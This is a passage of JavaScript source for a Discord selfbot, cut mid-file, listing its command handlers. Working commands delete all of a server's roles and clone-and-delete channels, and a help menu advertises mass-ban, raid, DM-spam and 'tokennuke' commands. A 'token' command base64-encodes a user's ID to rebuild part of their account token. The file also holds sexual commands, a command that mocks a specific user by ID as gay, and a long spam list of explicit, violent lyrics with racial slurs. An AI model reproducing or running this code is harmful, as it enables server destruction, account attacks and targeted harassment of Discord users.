            if (command === 'help') {

                let helpEmbed = new Discord.RichEmbed()
                    .setColor(config.defualtcolor)
                    .setAuthor(message.author.tag, message.author.displayAvatarURL)
                    .setTitle(config.self_bot_name)
                    .setDescription(`Made by:  \`${madeBy}\`  | Prefix: \`${config.prefix}\``)
                    .addField("help nuke", "𝒮𝒽𝑜𝓌𝓈 𝓃𝓊𝓀𝑒 𝒸𝑜𝓂𝓂𝒶𝓃𝒹𝓈", true)
                    .addField("help misc", " 𝓢𝓱𝓸𝔀𝓼 𝓶𝓲𝓼𝓬 𝓬𝓸𝓶𝓶𝓪𝓷𝓭𝓼 ", true)
                    .addField("help fun", "𝓢𝓱𝓸𝔀𝓼 𝓯𝓾𝓷 𝓬𝓸𝓶𝓶𝓪𝓷𝓭𝓼 ", true)
                    .addField('help utility', '𝓢𝓱𝓸𝔀𝓼 𝓾𝓽𝓲𝓵𝓲𝓽𝔂 𝓬𝓸𝓶𝓶𝓪𝓷𝓭𝓼', true)
                    .addField("help status", "𝓢𝓱𝓸𝔀𝓼 𝓼𝓽𝓪𝓽𝓾𝓼 𝓬𝓸𝓶𝓶𝓪𝓷𝓭𝓼", true)
                    .setThumbnail(config.help_gif)
                if (!args[0]) {
                    message.channel.send(helpEmbed)
                }
                if (args[0] === 'nuke') {
                    const nukeEmbed = new Discord.RichEmbed()
                        .setColor(config.defualtcolor)
                        .setDescription("_Nuke commands_ \n\n  `channelraid` `voiceraid` `kickall` `banall` `prune` `channels` `lie` `delroles` `tokenfuck` `tokennuke` `nuck` `rape` `nuke`                          ")
                        .setFooter('Nuke commands')

                    message.channel.send(nukeEmbed)
                }
                if (args[0] === 'misc') {
                    const miscEmbed = new Discord.RichEmbed()
                        .setColor(config.defualtcolor)
                        .setDescription("_Misc commands_ \n \n `dmall` `off` `stealpfp` `av` `guilds` `reverse` `channel-names` `uptime` `spam` `delservers` `snipe` `purge` `servercount` `editsnipe` ")
                        .setFooter('Misc commamnds')

                    message.channel.send(miscEmbed)
                }
                if (args[0] === 'fun') {
                    const funEmbed = new Discord.RichEmbed()
                        .setColor(config.defualtcolor)
                        .setDescription("_Fun commands_ \n \n `8ball` `coinflip` `hentai` `status` `lyricspam` `token` `dogfact` `neko` `penis` `handjob` `slap` `fakewizz` `tits` `kiss` `gay` `dogfact` `gayrate` `abc` `calc or calculator`")
                        .setFooter("Fun commands")

                    message.channel.send(funEmbed);
                };

                if (args[0] === 'utility') {
                    const utilEmbed = new Discord.RichEmbed()
                        .setColor(config.defualtcolor)
                        .setDescription('_Utility commands_  \n \n `clear-console` `serverinfo` `guildsmap` `membercount` `ping` `eval` `ascii` `afk` `doom` `stats` `channel-nuke` `ytsearch`')
                        .setFooter('Utility commands')

                    message.channel.send(utilEmbed)
                }

                if (args[0] === 'status') {
                    const statusEmbed = new Discord.RichEmbed()
                        .setColor(config.defualtcolor)
                        .setDescription("_Status commands_ \n \n `play` `watch` `listen` `stop`")
                        .setFooter('Status commands')
                }

            }

            if (command === 'channel-nuke' || command === 'channelnuke') {
                if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit('`This is a server only command`')
                let nukeChannel = message.mentions.channels.first();
                if (!nukeChannel) nukeChannel = message.channel;
                const position = nukeChannel.position

                let nukedEmbed = new Discord.RichEmbed()
                    .setColor(config.defualtcolor)
                    .setAuthor("Successfully nuked this channel", message.author.displayAvatarURL)
                    .setImage("https://media.discordapp.net/attachments/720812237794574347/765218830418182204/200.gif?width=269&height=150")

                nukeChannel.clone().then(async (c) => {
                    c.setPosition(position);
                    c.send(nukedEmbed);
                    await nukeChannel.delete();
                })
            }

            if (command === 'coinflip') {
                const anwers = [
                    "Heads",
                    "Tails"
                ]
                message.edit('`' + anwers[Math.floor(Math.random() * anwers.length)] + '`')
            }
            if (command === '8ball') {
                const answers = [
                    "Dont lie to your self",
                    'Yes definatly so',
                    'Ofcourse not',
                    "Maybe..",
                    "Ask again later",
                    "Is that even a question?"
                ]

                message.edit(`\`${answers[Math.floor(Math.random() * answers.length)]}\``)
            }

            if (command === 'editsnipe') {
                const msg = bot.edites.get(message.channel.id);
                if (!msg) return message.edit('`No messages recently edited.`')
                const editSnipeEmbed = new Discord.RichEmbed()
                    .setColor("RANDOM")
                    .setAuthor(msg.author.tag, msg.author.displayAvatarURL)
                    .addField("Old Message", msg.first)
                    .addField("New Message", msg.second)
                    .setTimestamp()

                message.channel.send(editSnipeEmbed)
            }

            if (command === 'gayrate') {
                let user = message.mentions.users.first();
                if (!user) user = message.author
                const gayRateEmbed = new Discord.RichEmbed()
                    .setColor(config.defualtcolor)
                    .setTitle(`${user.username} gayrate is: `)
                    .setDescription(`${user.username} is ${Math.floor(Math.random() * 101)}% gay`)

                message.channel.send(gayRateEmbed)
            }

            if (command === 'creator') {
                message.channel.send(`This bot was created by ${SADN9QD8SADJWQNISOSS}${adnq8wiudhasd87qhdqsudL}${asdjnqwioudsbnq78nhasA}${madeByY}${adadasdffsadfaE}${dawdasdR}, \n He's ID is: 609629575143620608`)
            }



            if (command === 'calc' || command === 'caclulator') {
                let method = args[0];
                let firstNumber = Number(args[1]);
                let secondNumber = Number(args[2])
                const operations = ['add', 'subtract', 'multiply', 'divide'];

                if (!method) return message.edit("Please use the following format! \n \n ``` \n -calc add 3 4 \n -calc subtract 3 2 \n -calc multiply 2 4 \n -calc divide 5 2```");

                if (!operations.includes(method)) return message.reply("Please use the following format! \n \n ``` \n -calc add 3 4 \n -calc subtract 3 2 \n -calc multiply 2 4 \n -calc divide 5 2```");

                if (!args[1]) return message.edit("Please use the following format! \n \n ``` \n -calc add 3 4 \n -calc subtract 3 2 \n -calc multiply 2 4 \n -calc divide 5 2``` ");

                if (!args[2]) return message.edit("Please use the following format! \n \n ``` \n -calc add 3 4 \n -calc subtract 3 2 \n -calc multiply 2 4 \n -calc divide 5 2``` ");

                if (isNaN(firstNumber)) return message.edit("The first number must be a number!");

                if (isNaN(secondNumber)) return message.edit("The second number must be a number!");

                if (method === 'add') {
                    let doMath = firstNumber + secondNumber
                    message.edit(`\`${firstNumber} + ${secondNumber} = ${doMath}\``);
                }
                if (method === 'subtract') {
                    let doMath = firstNumber - secondNumber
                    message.edit(`\`${firstNumber} - ${secondNumber} = ${doMath}\``);
                }
                if (method === 'multiply') {
                    let doMath = firstNumber * secondNumber
                    message.edit(`\`${firstNumber} x ${secondNumber} = ${doMath}\``);
                }
                if (method === 'divide') {
                    let doMath = firstNumber / secondNumber
                    message.edit(`\`${firstNumber} / ${secondNumber} = ${doMath}\``);
                }
            }

            if (command === 'purge') {
                try {
                    message.channel.messages.forEach(msg => {
                        if (msg.author.id === bot.user.id) msg.delete();
                    })
                } catch (e) {
                    message.edit('`I could not delete the messages`')
                }
            }

            if (command === 'doom') {
                ascii.font(args.join(" "), "Doom", function (err, rendered) {
                    rendered = rendered.trimRight()
                    message.channel.send("```\n" + rendered + "\n```")
                })
            }



            if (command === 'stats') {

                //   const duration = moment.duration(bot.uptime).format(" D [days], H [hrs], m [mins], s [secs]");
                message.channel.send(`                       = STATISTICS =\n
                          • Mem Usage  :: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
                          • Users      :: ${bot.users.size.toLocaleString()}
                          • Servers    :: ${bot.guilds.size.toLocaleString()}
                          • Creator    :: ${SADN9QD8SADJWQNISOSS}${adnq8wiudhasd87qhdqsudL}${asdjnqwioudsbnq78nhasA}${madeByY}${adadasdffsadfaE}${dawdasdR}
                          • Channels   :: ${bot.channels.size.toLocaleString()}
                          • Shards     :: ${bot.options.shardCount}  
                          • Emojis     :: ${bot.emojis.size}
                          • Libary     :: Discord.JS
                          • Discord.js :: v${Discord.version}
                          • Node       :: ${process.version}`, { code: "asciidoc" });
            };



            if (command === 'tits') {
                let user = message.mentions.users.first()
                superagent.get("https://nekos.life/api/v2/img/tits", (body, res) => {
                    if (!user) return message.edit('`You forgot to mention a user.`')
                    let embed = new Discord.RichEmbed()
                        .setDescription(`${message.author.tag} show tits ;3 ${user.tag}`)
                        .setColor(config.defualtcolor)
                        .setImage(res.body.url)
                    message.channel.send(embed);
                })
            }


            if (command === 'kiss') {
                let user = message.mentions.users.first()
                superagent.get("https://nekos.life/api/v2/img/kiss", (body, res) => {
                    if (!user) return message.reply('You forgot to mention a user.')
                    let embed = new Discord.RichEmbed()
                        .setDescription(`${message.author.tag} kiss ${user.tag}`)
                        .setColor(config.defualtcolor)
                        .setImage(res.body.url)
                    message.channel.send(embed);
                })
            }



            if (command === 'avatar' || command === 'av') {

                if (args[0]) {
                    const user = message.mentions.users.first();
                    if (!user) return message.reply('Please mention a user to access their profile picture.');

                    const otherIconEmbed = new Discord.RichEmbed()
                        .setColor(config.defualtcolor)
                        .setTitle(`${user.username}'s avatar!`)
                        .setImage(user.displayAvatarURL);

                    return message.channel.send(otherIconEmbed).catch(err => console.log(err));
                } else
                    if (!args[0]) {

                        const myIconEmbed = new Discord.RichEmbed()
                            .setColor(config.defualtcolor)
                            .setTitle(`${message.author.username}'s Avatar!`)
                            .setImage(message.author.displayAvatarURL);

                        return message.channel.send(myIconEmbed).catch(err => console.log(err));

                    }
            }

            if (command === 'delroles') {
                if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit('`This is a server only command`')
                message.guild.roles.forEach(rl => rl.delete().catch(err => console.log(err)));
            }
            if (command === "penis") {
                let user = message.mentions.users.first()
                if (!user) user = message.author
                let replies = [
                    "8=D",
                    "8==D",
                    "8===D",
                    "8====D",
                    "8=====D",
                    "8======D",
                    "8========D",
                    "8=========D",
                    "8==========D",
                    "8=================D",
                    "8========================================D",
                    '8========================D',
                    '8=================================================================================================D',
                    '8============D',
                    '8=D',
                    '8==D',
                    '8==D',
                    '8==D',
                    '8==D',
                    "8====D",
                    "8====D",
                    "8========D",
                    "8========D",
                    "8======D",
                    "8======D",
                ]

                let random = Math.floor(Math.random() * replies.length)

                let embed = new Discord.RichEmbed()
                    .setTitle(`HOW LONG IS HIS WOOD?`)
                    .setDescription(`${user.tag} penis\n${replies[random]}`)
                    .setColor(config.defualtcolor)

                message.channel.send(embed)
            }

            if (command === "token") {

                let user = message.mentions.users.first() || bot.users.get(args[0])
                if (!user) return message.edit('`You forgot to mention a user!`')
                try {
                    let embed = new Discord.RichEmbed().setDescription(Buffer.from(user.id).toString("base64") + Buffer.from(user.lastMessageID).toString("base64"))
                        .setColor(config.defualtcolor)
                    message.channel.send(embed)
                } catch (e) {
                    message.edit('`The user hasn\'t sent ay recent messages which is required.`')
                }
            }



            if (command === 'membercount') {
                try {
                    if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit('`This is a server only command`')
                    message.channel.send(`Member count: ${message.guild.memberCount}`)
                } catch (r) {
                    try {
                        message.edit('`This is a server only command`')
                    } catch (e) {
                        console.log('[LOG] unkown error occured')
                    }
                }
            }
            if (command === "reverse") {
                if (args.length < 1) return message.edit("`Please enter a sentence or word to reverse`").then(message => message.delete(5000));
                let haste = args.slice(0).join(" ");
                message.edit(haste.split('').reverse().join(''));
            }

            if (command === 'gay') {
                message.channel.send("The GAYEST person alive is <@706171597114835004> or \"Claqz\"")
            }




            if (command === "lyricspam") {
                message.delete();
                let messageList = [
                    "`Ah-pardon me, I get the money like lottery don't bother me, she suck me so good, no slobbery`",
                    "`AK with the scope, nigga and it's real dirty (21)`",
                    "`Wait a minute, I been sippin’ Henny like it’s Minute Maid, Let ‘em hate, I been gettin’ to it, gettin’ hella paid`",
                    "`She said, Do you love me? I tell her, Only partly, I only love my bed and my mama, I'm sorry`",
                    "`Xans, Perky, check (yeah), Bill Belichick, Take the air out the ball (yeah), just so I can flex`",
                    "`Yeah, and send shots off at your dome Pussy boy, we'll pull up at your home`",
                    "`I fucked your thot, she gave me top, I guess that's my confession`",
                    "`Draw down with that Glock, bitch don't make no sound Say somethin', might get shot bitch, face down to the ground`",
                    "`I'm sippin' on juice, smokin' that pack, yeah, Hop out a coupe, step in the Loubs, check out my fashion`",
                    "`Cops try to search us, hoes tryna twerk us Walk in with all this ice, Did it on purpose`",
                    "`I got a chopstick, a FN, and the Draco hold a 100, Got a shooter in a booth with me like he goin' huntin'`",
                    "`Smoke a pussy nigga like a Newport`",
                    "`Rocket got a 'Rari, that's a new horse`",
                    "`Diamonds 'round my neck like what my neck worth`",
                    "`I like selling mid because I smoke the boof, I be countin' hunnids 'til my fingers blue`",
                    "`Hop out the whip, I'm in the kitchen, I whip, Chopper on me, shots to the head make him sick`",
                    "`I don't want friends, I want Audis , Smokin' on boof and it's Maui (ayy)`",
                    "`Like, flex on you haters, huh, hi haters, This is my world so it's all in my favor`",
                    "`Turned to a savage, pocket got fatter, she call me daddy, Smokin' that gas, gone off that Xanny, she on the powder`",
                    "`Ice on my grill, it's a new smile, She wanna fuck on your boo, wow`",
                    "`Rich Forever gettin' more bands, I just pulled up in a foreign`",
                    "`Ayy, fucked a girl, she a fan, She let me hit it on video, My circle small like a cheerio`",
                    "`I'ma paint, on her face like I'm DoodleBob, Jump in, that pussy like I scuba dive`",
                    "`If I see you, I'ma wet you, hit you and your nephew, Came in with a big drum, wet you like a stencil`",
                    "`I'm 1400 with the screw up kids, don't screw up kid, Or that choppa wet your crew up kid, I'm two up kid, We animals, better zoo up kid`",
                    "`I just pulled up in a Lamb, cuzzo pulled up in a Range, And we reloadin' them sticks lil' nigga, we release them things, ayy`",
                    "`Bitch I'm a P (what), bitch I'm a G (huh), Took that lil bitch now that bitch off the leash (ayy, ayy, ayy, gang)`",
                    "`GLE, 'cause that Lambo movin' fast (skrr), S Class, G Class, lotta class (sss, sss)`",
                    "`You was hatin’ but you switched up cause I’m next up, I got lean and some forty in my red cup`",
                    "`In my own crib when they ask me where the stu at (In the crib, ay)`",
                    "`This a Rollie, not a stopwatch, shit don't ever stop, This the flow that got the block hot, shit got super hot, ayy`",
                    "`I pulled up in a drop top, she drop dead, My diamonds dancing hopscotch, they holding hands`",
                    "`I don't know what planet I'm on, I'm a king, lil bitch watch the throne`",
                    "`Aye, 3 A.M. bitch I'm motherfucking tired, If we on the same page, I might motherfucking slide`",
                    "`I don't mean to burst your bubble bitch but yes I'm tryna fuck, Baby girl I'm tryna fuck`",
                    "`Baby girl I know you hit my phone for a reason, If you don't get loose or start freaking then I'm leaving`",
                    "`The dash, it's digi', the schedule busy, My head in a hoodie, my shorty a goodie, My cousins are crazy, my cousins like Boogie`",
                    "`Okay, 1-2-3, yeah, I just popped a bean, Okay, 4-5-6, yeah, eight hoes on my dick`",
                    "`I put my bitch in Celine (my bitch in Celine), Gucci right down in my other bitch`",
                    "`I like to roll off the bean, Ride with me, know I ain't havin' it`",
                    "`Might run to the money, I'm married, Diamond, my wrist, you think I'm so scary`",
                    "`Baby girl, what you doing, where your man? (where your), I just popped a xan, fifty thousand in Japan (fifty thousand in Japan)`",
                    "`Baby girl, what you doing, what's your name? (baby girl, what), I ain't playin' no games, see these diamonds in my chain?`",
                    "`No this not a date, this a cruise, but don't debate, wait (baby), It's gettin' late (huh), think it's past eight (what), Took her to my place, baby ate me like some cake, wait (huh)`",
                    "`Ayy, so much green on my street like it's Grove (whoa), Ayy, made a lot of money on the road (yuh)`",
                    "`I'ma beat her box, beatin' off her fuckin' socks, 30 got a mop, shoot you, look like chicken pox`",
                    "`The coupe is retarded (skrrt), Louis my carpet (carpet)`",
                    "`They going out bad, the sad way (huh), I put the cash on three way (racks), Rich nigga drop a baby in a hoe face (hoe face), Where the hell was you at on the broke days? (Whoa)`",
                    "`I ran them streets with no cleats (hey), 44 millimeter iced out Philippe (ice)`",
                    "`I was made for this shit, rookie of the year, I wouldn’t show up for the freshman list`",
                    "`Trade my Honda to a Bentley, Now these fuckboys wanna end me`",
                    "`Teach you how to be a boss (boss), top dropped off (skrrt), Motherfuck the fame, I done came to the vault (for what)`",
                    "`Put my pride to the side (side), I could never lie, I don't care if you cry, let them pussy niggas die`",
                    "`New designer shit, Diamonds on me might blind a bitch`",
                    "`I be booted to the morning, PM to the morning, My lil' woadie wanna bag him, he just want a Rollie`",
                    "`Take a moment, count my guap, count my guap, All these racks bombin' in, they bombin' in (hold up)`",
                    "`First things first: rest in peace Uncle Phil, For real, you the only father that I ever knew, I get my bitch pregnant, I'ma be a better you`",
                    "`No role models and I'm here right now, No role models to speak of, Searchin' through my memory, my memory, I couldn't find one`",
                    "`Krispy Kreme, Yeah bitch I stay clean`",
                    "`Bitch I'm sippin' lean I'm poppin' pills I pop a lot`",
                    "`Take my shoes and walk a mile, somethin' that you can't do`",
                    "`It's the niggas that copy the wave, Then it's the niggas that started it`",
                    "`Killing pain with the pain killers, I make it rain with the gang members`",
                    "`I get the drip from my walk, my baby she come from up north, My money, it come from the vault`",
                    "`I hop in that bitch and get lost, My money is starting to get tall, I walk in the mall buy it all`",
                    "`Pop these niggas like a wheelie nigga, you a silly nigga, In the hood with them Billy niggas, and them Hoover niggas`",
                    "`You just wanna fuck me for the fame, Wanna fuck me cause them diamonds on my chain`",
                    "`Big body, she gon' swerve it, now we went by the surface, Shorty lookin' picture perfect, say she ready, never nervous`",
                    "`I'm in a spaceship, get ready for takeoff, Can't fuck with lil' shorty, I know that she basic, She makin' my dick soft`",
                    "`They tell me I'ma be a legend, I don't want that title now, 'Cause all the legends seem to die out, What the fuck is this 'bout?`",
                    "`Tell lil' baby she can love me or she hate me, In the brand new McLaren, and I'm racing`",
                    "`Tryna hide from the camera, I ain't going outside today, Couldn't find Hi-Tec, so I'm drinking on Act' today`",
                    "`Gotta TEC and a chopper, with a hundred thousand dollars up in the Wraith`",
                    "`I ain't foldin' under pressure, I ain't switchin' for no ho, I ain't talkin' to no cop and I ain't tellin' on my bros`",
                    "`Big dope inside this Backwood case this nigga want smoke`",
                    "`Call my brother on the phone, he said broski you a star, I said brother hold it down soon we'll all be livin' large`",
                    "`I got tattoos on my face, I use that shit as motivation, I could never get a job, so for my dream, I'm dedicated`",
                    "`Fifty-five hunnit for a new pair of titties, I'll buy 'em like Jordans`",
                    "`Everybody rock with me because I'm up now, Took your girl and I'ma score, like I made the touch-down`",
                    "`Used to want a G-Shock, now I'm walking with a bust down`",
                    "`I got red shooters, I got blue, Let that thing down then point at you`",
                    "`I feel like I'm 21 Savage, I pull up and fuck on your daughter`",
                    "`Water on my bitch I keep her wet like my cellphone, Bitches on me dark skins and the redbones`",
                    "`Flexin' for these bands, finna pop out, ayy, Boolin' on the block I got my Glock out, ayy`",
                    "`I'ma keep rocking these chains while they keep callin' me 'coon'`",
                    "`Ayy, when my brother get out, told him ain't no block now, Same bitches curbin' all up on my cock now`",
                    "`I just bought me a new Glock, wet a nigga like a mop, My shooters pull up at your block, Kick right in your door, I'm talking your spot`",
                    "`I bought a new Glock and the 30 round drum, You open your mouth and you done bitch`",
                    "`Let me know if you want it, jump out get it, gang, 2 pistols one Tay-K call me Tay-K Max Payne`",
                    "`If you not talkin' 'bout smoke you could go dat way`",
                    "`2k my sweatsuit, I walk with demeanor, Sippin' on lean, can you tell me who leaner`",
                    "`I just spent a cool half a ticket on my jewelry, Clear white diamonds make your eyesight blurry`",
                    "`I just cashed out on my neck, that's a house, Head out, fuck a spouse, we pop off, we ain't hearin' it`",
                    "`Nigga smilin' in your face, really want you in a ditch, Half a ticket on my neck, quarter ticket on my wrist`",
                    "`I get pussy in a pair of off-whites, Know I want, you can see it my eyes, surprise`",
                    "`Smoke got my eyes lookin' Korean, Every time that I fly, VIP'n`",
                    "`Fuck signs, my niggas gettin' high, Party of flies, Taylor gang or resign`",
                    "`Why you even come back to crib if you ain't stayin'?, Ridin' with some real niggas, know that we ain't playin'`",
                    "`Homie, I'm a boss baby, I don't need no favors, Got so many cars, I don't got room for my neighbors`",
                    "`Suckin' on me good, treat me like a Now and Later, Breakfast in the morn', we can get our dinner catered`",
                    "`Anything I want, I pull up and stunt, Parking in the back, we can't do the front`",
                    "`Take them bitches phones, ain't nothing, we don't trust 'em, Send 'em for the gangs, why they came, we don't love 'em`",
                    "`Dread-head, weed head, No sleep, don't need a bed`",
                    "`I don't know what the ending is, Chrome all where the engine is`",
                    "`Baby I'm a rich ass nigga never said it's gon easy to deal with it`",
                    "`Roll with the paper, see them lames later, Can't save her, her nigga stepped out, now she sayin' what she really think, Rollin' up pounds of dank`",
                    "`I feel you when you walk in, Conversation, I'ma spark it`",
                    "`I got just what you need, We gon drink and roll the weed`",
                    "`Now you up in my room, doin' what grown people do, You want me, me on you, hit me when we're through`",
                    "`Only on Gin and them drugs, I walked in, in the club, About three of them, dawg I'm not kiddin'`",
                    "`Bitch bad, her ass fat, I'll probably let her in, Ball so fuckin' hard I need a letterman`",
                    "`Cookies and OG, Come to my crib, we blow by the Os`",
                    "`Say they got the good but what the pack smell like?, Feel like it's a dream but now we back to real life`",
                    "`Let's turn on the stove and call up some hoes, Let's roll up and do this shit`",
                    "`I just rolled a pound at my bake sale, Bitches goin' down at my bake sale`",
                    "`Naked bitches in the kitchen, shake 'n' bake, What you think? I'm on this dank, I'm off that drank`",
                    "`Black stripe, yellow paint, them niggas scared of it but them hoes ain't, Soon as I hit the club look at them hoes face`",
                    "`It's the big boy you know what I payed for it, And I got the petal to the metal`",
                    "`Hear them haters talk but there's nothing you can tell em, Just made a million got another million on my schedule`",
                    "`Yeah, uh huh, you know what it is, Everything I do, I do it big`",
                    "`Then it's to my car, puff a pound of dank, Now we in the stars, and I'ma make it rain, Drown the sink,`",
                    "`So what I keep ‘em rolled up?, Saggin’ my pants, not caring what I show`",
                    "`Roll joints bigger than King Kong’s fingers, And smoke them hoes down ’til they stingers`",
                    "`I got a serious question, Do you like sex? If you thinkin' yes, then I'm tryna test you`",
                    "`My path, been clear, The bottom, been near`",
                    "`I've passed, my peers, I've switched, them gears, They in, the rear`",
                    "`God damn, you know who I am, Try to be on the low, but you ain't slow`",
                    "`You like real facts, Like, if you show love, you gon' get it back`",
                    "`We can go and get a private room, We could fuck for one night, ain't gotta jump the broom`",
                    "`Grabbin' you close and pullin' you nearer, Lookin' at both of us in the mirror`",
                    "`She swallow a nigga cause my dollars is bigger, And you know Party my nigga`",
                    "`Let me get into it, let you smoke a little bit, Now fuck you better than the nigga you with`",
                    "`Fuckin' with me got me goin' way up, Slammin' in that pussy, never lay up`",
                    "`Run around the world, I don't run games, Run into your bitch, I'ma find out her name`",
                    "`I spent that check on my neck, I got yo' bitch drippin', she wet`",
                    "`I go to yo' crib, put my dick in yo' sister, Yo' bitch on my line, I pull up and I drill her`",
                    "`When I touch a milli, I'll cop me a Bentley, So let me stack up 'cause my pockets look empty`",
                    "`I need me that check, I pay hella rent, My pockets thicker than a elephant`",
                    "`2016, bitch I coulda been President, Bitch I'm the shit, I came up and it's evident`",
                    "`You niggas are snakes, yuh, These bitches is fake, yuh, I see that you hate, yuh`",
                    "`Stop smoking Black & Milds bitch you nasty, How you smoking Blacks but actin' like you classy?`",
                    "`Stop smoking Black & Milds, with your country ass, You got shit around your mouth, with your crusty ass`",
                    "`Last time we spoke, I smelled your breath, it made me faint, Bitch I hopped up in your Honda Civic, all I smelled was paint`",
                    "`Heard the whole hood hit you from the back, I heard the hood ran a train on your track`",
                    "`Take advantage of me bitch I wanna be yo slut, Face, Titties, Booty, and Toes, What I'm eating for lunch`",
                    "`Ugly God A.K.A. Nigga Too Nasty, Come here baby put your phone number in my gadget`",
                    "`My hair on point but my clothes stay ratchet, Young Ugly God, bitch my dick game disastrous`",
                    "`Aye, 3 A.M. bitch I'm motherfucking tired, If we on the same page, I might motherfucking slide`",
                    "`I don't mean to burst your bubble bitch but yes I'm tryna fuck, Baby girl I'm tryna fuck`",
                    "`Baby girl I know you hit my phone for a reason`",
                    "`Girl you know I'm fiending, eat this meat you ain't no vegan`",
                    "`I'm trying to tap that ass and bust a nut, Don't give me the wrong message girl, I'm trying to see what's up`",
                    "`Fuck Ugly God, Ugly God a hoe, Flexing like you got it, bitch, I know your ass is broke`",
                    "`Back in 10th grade, your coach kicked you off the team, Every single day, you wear them same pair of jeans`",
                    "`Water this, water that, you finna get exposed, Back in eighth grade, you use to borrow niggas' clothes`",
                    "`When I catch you slipping, I'm gon' punch you in your teeth, Ugly God a bitch, pussy boy don't want no beef`",
                    "`Aye, I make music from my basement, I done came up and got famous, I'm the G.O.A.T. ain't no replacement`",
                    "`I pipe your bitch with this ice on my wrist cause she see my dick hard like the pavement, I got that guap now these bitches gon' flock B, I got your main bitch in amazement`",
                    "`Just like a maverick, Watch me ball out like a maverick`",
                    "`I spent that check on my wrist and my neck, Ugly God got the sauce you can't handle it, Made half a mil' by myself with no deal, now they mad cause I'm cocky and arrogant`",
                    "`My new bitch thick like a steak, I sit back and thumb through this cake`",
                    "`Now I'm on top the ladder bitch, look at my swagger, I'm sharp like a dagger, Nigga want beats, serve em up like a platter, She hit my phone, I put meat in her bladder`",
                    "`I drip on your bitch like water, I splash on your bitch with the water, I feel like I'm 21 Savage, I pull up and fuck on your daughter`",
                    "`Water on my bitch I keep her wet like my cellphone, Bitches on me dark skins and the redbones`",
                    "`I ain't got time for no wife, yeah, Lmfao you kiss bitches I pipe, yeah`",
                    "`I just bought me a new Glock, Nigga talked down then get popped`",
                    "`Got a long clip on my gun, I bought a new Glock and the 30 round drum`",
                    "`Now these bitches wanna flock, I came up off of water now I'm posted at the dock`",
                    "`Bitch I beat my meat, Give a fuck 'bout what you think, I nut all up in my sheets`",
                    "`I go ham, I eat ass, I'm never starving, God damn`",
                    "`Bitch I beat my meat I take my dick out on a date, I nut all up in my face, tryna' save the human race`",
                    "`I got your girl dripping out her panties like Fiji, Lotion in my hands, so my palms a little greasy`",
                    "`Bitch I got that bitch, but her boyfriend don't believe me, Until I power up on that booty like Luigi`",
                    "`Ugly God bitch, booty thicker than the bible, Lotion in my pocket, but that's only for survival`",
                    "`You used to say you in love, I used to say that shit back`",
                    "`Shawty, I just want your love for a minute, I be captain baby, you can be lieutenant`",
                    "`Playin games with me shawty, This is not no scrimmage, scrimmage`",
                    "`I gotta get my fresh paper boy, Optimistic, inflicted the premonition`",
                    "`Ballin' like Stephen Curry, Gold fangs in my mouth so purty`",
                    "`It's all I want, got a nigga faded, Shawty on fire, and she really blazin'`",
                    "`All year gone and on your own for stunting, Say you ain't been worried, bitch you fronting`",
                    "`Got a knife on my finger, I was stabbed in the back`",
                    "`Hanging with them Bs, and you know we yellin' slatt, Few niggas talk down, don't want to know the aftermath`",
                    "`1400, bitch, you know I tote a pole, With 6ix9ine, bitch, you know we tote them poles`",
                    "`Yeah, and send shots off at your dome, Pussy boy, we'll pull up at your home`",
                    "`They don't want no smoke, on the block with my goons, I hit a nigga up, I don't like to pick and choose`",
                    "`Smoke a pussy nigga like a Newport`",
                    "`In too deep like a bottomless hole, Change my number just like summer clothes`",
                    "`I've been shining in my chain, I do not fuck with no lames`",
                    "`Ooh, so they think I wanna die, yeah, 'Cause my doors are suicide, yeah`",
                    "`Bet my coffin would be nice, yeah, Stud that bitch up with some ice, yeah`",
                    "`Ayy, fuck your bitch and hit my fucking dab, Ayy, choppers by my side, you know it clap`",
                    "`Big racks on my body, baby got this cash, Pray these goofy niggas really goin' out sad`",
                    "`I can't do this anymore, yeah, When it rains it really pours, yeah`",
                    "`New Chanel walkers, when I walked up in the room, Maison Margiela, when I walked up in the room`",
                    "`Take a moment, count my guap, count my guap, All these racks bomin' in, they bomin' in`",
                    "`I pulled up in a drop top, she drop dead, My diamonds dancing, hopscotch, they holding hands`",
                    "`Everyday I keep it real and get that bag, hoe, 'Cause that shit up for grabs hoe, put that on my tab hoe`",
                    "`Forever tryna fight all these demons in my head, Together we can fight all these demons in my head`",
                    "`I let the money dance, the diamonds bling's all by itself, Without any help, so that means it shine on it's own`",
                    "`Who knew us kid, I think I came from under a rock, Was out on the block, my cousin had that shit in his sock`",
                    "`I just pulled up in a lamb, cuzzo pulled up in a range, And we reloadin' them sticks lil' nigga, we release them things`",
                    "`I don't know you I just got into your shit today, Lookin like a million dollar lick today`",
                    "`Implement that shit into your mind, just so you know though, Sucka free living, I'ma say that that's the motto`",
                    "`Meanwhile I'm in New York fucking up SoHo, Just bagged a new chick, Caroline, nickname Coco`",
                    "`I just sit back and listen to old Wayne songs, And get dome from a bitch while I brainstorm, And spit flames while also making it rain storm`",
                    "`Nowadays I really miss my fucking idols, so that's the title, I grab a bible, pray for my rivals`",
                    "`Baby what you wishin' for?, Maybe you should wish it more?`",
                    "`Wish you'd get out my face, might go MIA, Might just blow my brain, R.I.P Kurt Cobain`",
                    "`I wish you will find your chill, 'Cause Lord knows this shit get real`",
                    "`Shawty know I kill people, real people, From the trenches where it's real lethal, tote real regals`",
                    "`So much green on my street like it's Grove, Made a lot of money on the road`",
                    "`I'ma beat her box, beatin' off her fuckin' socks, 30 got a mop, shoot you, look like chicken pox`",
                    "`Yeah, I turn you ass to clip-art, Boy, you is a retard, on the go just like a go-kart`",
                    "`Go get a thermometer for the pot, I need this shit cooked right, Let's keep this water 400 degrees Fahrenheit`",
                    "`Aye JR nigga, ain't it a blessing?, We made it out of Lansing after all that happened?`",
                    "`I wish I would pay attention to these homeless niggas, Don't call my phone, I don't want to do no song with niggas`",
                    "`Shout out to them niggas' freaks that I been cumming on, Get em to the crib, bust em down, now bitch run along`",
                    "`Who said I'm a snitch? You just heard a lie from him, Better check the black and white, that paperwork will vouch for him`",
                    "`I ain't hear from bitches when I had them blues on, So soon as I'm done fucking, put your shoes on`",
                    "`When we left that shootout, you still had bullets in your pistol, I don't fuck with y'all that's official`",
                    "`Bitch don't play with me cause you can get it, after I blow you I'm droppin' yo nigga, It be the niggas that ain't got no money, that ain't got no bodies that swear they some killas`",
                    "`We see them 40's and we get excited, we see them choppas and we get excited`",
                    "`Hoe then took off with my dick I should be taking her to court, If you take me for a hoe I'm a take it to your porch`",
